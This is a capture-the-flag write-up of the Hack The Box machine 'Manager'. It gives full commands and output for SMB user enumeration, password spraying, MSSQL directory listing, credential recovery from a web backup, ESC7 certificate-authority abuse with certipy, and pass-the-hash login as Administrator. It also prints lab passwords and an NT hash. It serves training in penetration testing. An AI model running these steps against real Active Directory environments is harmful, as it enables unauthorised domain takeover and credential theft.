---
slug: /write-up/htb/machines/medium/manager
pagination_next: null
pagination_prev: null
---

## Enumeration

There are a lot of ports opened ...

```bash
└─$ nmap 10.10.11.236                 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-02 20:09 CET
Stats: 0:00:02 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan
Ping Scan Timing: About 50.00% done; ETC: 20:09 (0:00:02 remaining)
Nmap scan report for 10.10.11.236
Host is up (0.045s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp open  domain  Simple DNS Plus
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

80/tcp open  http    Microsoft IIS httpd 10.0
|_http-title: Manager
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

PORT   STATE SERVICE      VERSION
88/tcp open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-01-03 01:14:27Z)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

PORT    STATE SERVICE VERSION
135/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

139/tcp open  netbios-ssn Microsoft Windows netbios-ssn
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

389/tcp open  ldap    Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-01-03T01:17:01+00:00; +5h59m52s from scanner time.
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

445/tcp open  microsoft-ds?

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 5h59m51s
| smb2-time: 
|   date: 2024-01-03T01:17:48
|_  start_date: N/A

464/tcp  open  kpasswd5
593/tcp open  ncacn_http Microsoft Windows RPC over HTTP 1.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

636/tcp open  ssl/ldap Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
|_ssl-date: 2024-01-03T01:20:28+00:00; +5h59m52s from scanner time.
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 5h59m51s

1433/tcp open  ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2024-01-03T01:21:19+00:00; +5h59m52s from scanner time.
| ms-sql-info: 
|   10.10.11.236:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   10.10.11.236:1433: 
|     Target_Name: MANAGER
|     NetBIOS_Domain_Name: MANAGER
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: manager.htb
|     DNS_Computer_Name: dc01.manager.htb
|     DNS_Tree_Name: manager.htb
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-12-21T20:26:45
|_Not valid after:  2053-12-21T20:26:45

Host script results:
|_clock-skew: mean: 5h59m51s, deviation: 0s, median: 5h59m51s

3268/tcp open  ldap    Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-01-03T01:22:42+00:00; +5h59m53s from scanner time.
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 5h59m52s


3269/tcp open  ssl/ldap Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
|_ssl-date: 2024-01-03T01:24:11+00:00; +5h59m52s from scanner time.
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Samba is open, so we can enumerate the shares:

```bash
└─$ smbclient -L \\dc01.manager.htb -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to dc01.manager.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

## Foothold

We can use `crackmapexec` to brute-force the users:

```
┌──(gal㉿gal)-[~/workspace/gal/htb]
└─$ crackmapexec smb 10.10.11.236 -u anonymous -p "" --rid-brute 10000
SMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.236    445    DC01             [+] manager.htb\anonymous: 
SMB         10.10.11.236    445    DC01             [+] Brute forcing RIDs
SMB         10.10.11.236    445    DC01             498: MANAGER\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.236    445    DC01             500: MANAGER\Administrator (SidTypeUser)
SMB         10.10.11.236    445    DC01             501: MANAGER\Guest (SidTypeUser)
SMB         10.10.11.236    445    DC01             502: MANAGER\krbtgt (SidTypeUser)
SMB         10.10.11.236    445    DC01             512: MANAGER\Domain Admins (SidTypeGroup)
SMB         10.10.11.236    445    DC01             513: MANAGER\Domain Users (SidTypeGroup)
SMB         10.10.11.236    445    DC01             514: MANAGER\Domain Guests (SidTypeGroup)
SMB         10.10.11.236    445    DC01             515: MANAGER\Domain Computers (SidTypeGroup)
SMB         10.10.11.236    445    DC01             516: MANAGER\Domain Controllers (SidTypeGroup)
SMB         10.10.11.236    445    DC01             517: MANAGER\Cert Publishers (SidTypeAlias)
SMB         10.10.11.236    445    DC01             518: MANAGER\Schema Admins (SidTypeGroup)
SMB         10.10.11.236    445    DC01             519: MANAGER\Enterprise Admins (SidTypeGroup)
SMB         10.10.11.236    445    DC01             520: MANAGER\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.11.236    445    DC01             521: MANAGER\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.236    445    DC01             522: MANAGER\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.11.236    445    DC01             525: MANAGER\Protected Users (SidTypeGroup)
SMB         10.10.11.236    445    DC01             526: MANAGER\Key Admins (SidTypeGroup)
SMB         10.10.11.236    445    DC01             527: MANAGER\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.11.236    445    DC01             553: MANAGER\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.11.236    445    DC01             571: MANAGER\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.236    445    DC01             572: MANAGER\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.236    445    DC01             1000: MANAGER\DC01$ (SidTypeUser)
SMB         10.10.11.236    445    DC01             1101: MANAGER\DnsAdmins (SidTypeAlias)
SMB         10.10.11.236    445    DC01             1102: MANAGER\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.11.236    445    DC01             1103: MANAGER\SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias)
SMB         10.10.11.236    445    DC01             1113: MANAGER\Zhong (SidTypeUser)
SMB         10.10.11.236    445    DC01             1114: MANAGER\Cheng (SidTypeUser)
SMB         10.10.11.236    445    DC01             1115: MANAGER\Ryan (SidTypeUser)
SMB         10.10.11.236    445    DC01             1116: MANAGER\Raven (SidTypeUser)
SMB         10.10.11.236    445    DC01             1117: MANAGER\JinWoo (SidTypeUser)
SMB         10.10.11.236    445    DC01             1118: MANAGER\ChinHae (SidTypeUser)
SMB         10.10.11.236    445    DC01             1119: MANAGER\Operator (SidTypeUser)
```

So far, we found the following users:

- zhong
- cheng
- ryan
- raven
- jinwoo
- chinhae
- operator

We have a complete version number: `Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)`

Now we can do password spraying with the users:

```bash
crackmapexec smb 10.10.11.236 -u exfil/users -p exfil/users
```

And we found out the username and password for `operator`:

```
SMB         10.10.11.236    445    DC01             [+] manager.htb\operator:operator 
```

## Lateral movement

With that user we cannot do much, if we try to connect with evil-winrm, we will get connection refused.

LDAP is opened, we can try to dump all the contents of it:

```bash
ldapdomaindump 10.10.11.236 -u 'manager.htb\operator' -p 'operator' --no-json --no-grep
```

MS SQL is also open, so we can try to connect using the found user/password:

```bash
mssqlclient.py manager.htb/operator:operator@dc01.manager.htb -windows-auth
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (MANAGER\Operator  guest@master)> 
```

Here, it looks like we have permission to read the file structure:

```bash
SQL (MANAGER\Operator  guest@master)> EXEC xp_dirtree 'C:\inetpub\wwwroot', 1, 1;
subdirectory                      depth   file   
-------------------------------   -----   ----   
about.html                            1      1   
contact.html                          1      1   
css                                   1      0   
images                                1      0   
index.html                            1      1   
js                                    1      0   
service.html                          1      1   
web.config                            1      1   
website-backup-27-07-23-old.zip       1      1   
```
Now we have two interesting files to check: web.config and website-backup ...

The web.config is protected, so we can't download it, however we are able to download the backup...

In the backup we can find the user and password for a user that is in the `Remote Management Users` which sounds good...

```
<user>raven@manager.htb</user>
<password>R4v3nBe5tD3veloP3r!123</password>
```

With those credentials, we can use evil-winrm and get the user flag.

```bash
evil-winrm -i dc01.manager.htb -u raven -p 'R4v3nBe5tD3veloP3r!123'
```

## Privilege escalation

Could not get it in time, but here's how it was done by another people: https://0xdf.gitlab.io/2024/03/16/htb-manager.html#box-info

After getting the user flag, a little bit of lurking around the machine did not provide anything interesting. So, we'll explore Active Directoy Certificate Service with `certipy`.

```bash
certipy find -dc-ip 10.10.11.236 -ns 10.10.11.236 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -vulnerable -stdout
[!] Vulnerabilities
      ESC7                              : 'MANAGER.HTB\\Raven' has dangerous permissions
```

Nice, now we can explote this `ESC7` vulnerability: ESC7 is when a user has either the "Manage CA" or "Manage Certificates" access rights on the certificate authority itself. Raven has ManageCa rights.

First, I’ll need to use the Manage CA permission to give Raven the Manage Certificates permission:

```bash
certipy ca -ca manager-DC01-CA -add-officer raven -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'Raven' on 'manager-DC01-CA'
```

Now raven appears in the find as certificate manager:

```bash
certipy find -dc-ip 10.10.11.236 -ns 10.10.11.236 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -vulnerable -stdout
...[snip]...
        ManageCertificates              : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
                                          MANAGER.HTB\Raven
```

Now, we will try to retrieve the Administrator certificate to connect with evil-winrm as administrator.

First: Request the admin cert:

```bash
certipy req -ca manager-DC01-CA -target dc01.manager.htb -template SubCA -upn administrator@manager.htb -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
Certipy v4.8.2 - by Oliver Lyak (ly4k)                             

[*] Requesting certificate via RPC                         
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 13
Would you like to save the private key? (y/N) y
[*] Saved private key to 13.key
[-] Failed to request certificate
```

This fails, but we can keep the private key. Then, using the Manage CA and Manage Certificates privileges, I’ll use the ca subcommand to issue the request:

```bash
certipy ca -ca manager-DC01-CA -issue-request 13 -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
Certipy v4.8.2 - by Oliver Lyak (ly4k)
                                                                    
[*] Successfully issued certificate
```

Now, the issued certificate can be retrieved using the req command:

```bash
certipy req -ca manager-DC01-CA -target dc01.manager.htb -retrieve 13 -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
Certipy v4.8.2 - by Oliver Lyak (ly4k)    
                                                                    
[*] Rerieving certificate with ID 13          
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@manager.htb'
[*] Certificate has no object SID
[*] Loaded private key from '13.key'                     
[*] Saved certificate and private key to 'administrator.pfx'
```

With this certificate as the administrator user, the easiest way to get a shell is to use it to get the NTLM hash for the user with the auth command. This requires the VM and target times to be in sync.

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.236                                   
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@manager.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
```

With the hash, we can connec to evil-winrm:

```bash
oxdf@hacky$ evil-winrm -i manager.htb -u administrator -H ae5064c2f62317332c88629e025924ef

Evil-WinRM shell v3.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

and grab the root.txt file